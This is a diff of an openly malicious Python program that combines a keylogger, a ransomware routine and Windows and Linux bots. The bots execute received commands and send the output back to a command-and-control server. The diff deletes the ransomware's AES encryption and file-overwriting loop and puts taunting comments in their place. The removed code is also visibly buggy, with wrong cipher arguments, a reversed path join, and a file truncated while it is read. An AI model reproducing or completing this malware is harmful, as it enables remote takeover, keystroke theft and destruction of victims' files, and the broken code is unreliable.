@@ -19,7 +19,7 @@ try:
 except ImportError as e:
     print(f"Import error: {e}")
     
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 #  CONSTANTS  #
 FILENAME = __file__[2:]
@@ -32,7 +32,7 @@ BLOCK_CIPHER_STRING = "You have been pawned!" # The string to use in cipher bloc
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def create_client_socket():
 	"""This function creates a client socket to connect to 
@@ -78,7 +78,7 @@ def auto_recon():
 
 	"""
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 # Keylogger stuff-=-=-=-=-=-=-=-=-=-=-=-=-=-
 def on_press(key):
@@ -119,7 +119,7 @@ def keylogger():
 		except OSError:
 			pass
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 # Ransomware stuff-=-=-=-=-=-=-=-=-=-=-=-=-=
 def encrypt_it(data: str):
@@ -129,8 +129,7 @@ def encrypt_it(data: str):
 		Returns:
 			Will return the encrypted form of the files contents.
 	"""
-	AES_obj = AES.new(KEY, AES.MODE_CBC, BLOCK_CIPHER_STRING)
-	return AES_obj.encrypt(data)
+	# THIS IS FOR YOU CHRIS !!!!!!!!!!!!!!!!!!
 
 def decrypt_it(data: str):
 	"""This function will decyrpt the data passed as an argument.
@@ -139,28 +138,16 @@ def decrypt_it(data: str):
 		Returns:
 			Will return the decrypted form of the files contents.
 	"""
-	AES_obj = AES.new(KEY, data, AES.MODE_CBC, BLOCK_CIPHER_STRING)
-	return AES_obj.decrypt(data)
+	# THIS IS FOR YOU CHRIS !!!!!!!!!!!!!!!!!!
 
 def ransomware(*request: str):
 	"""This function will encrypt a folder, a file, or the entire volume on a computer.
 		Arguments:
 		Returns
 	"""
-	action, path = request
-	for f in listdir(path):
-		abs_path = path.join(f, path)
-		with open(abs_path, 'r') as input_file:
-			to_write = None
-			with open(abs_path, 'w') as output_file:
-				file_contents = input_file.read()
-				if action == 'encrypt':
-					to_write = encrypt_it(file_contents)
-				else:
-					to_write = decrypt_it(file_contents)
-				output_file.write(to_write)
+	# THIS IS FOR YOU CHRIS !!!!!!!!!!!!!!!!!!
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 class WindowsBot:
 	"""This class definition will contain the functions and commands
@@ -197,7 +184,7 @@ class WindowsBot:
 					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
 					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 		
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 class LinuxBot:
 	"""This class definition will contain the functions and commands
@@ -235,7 +222,7 @@ class LinuxBot:
 					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
 					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def main():
 	obj = None
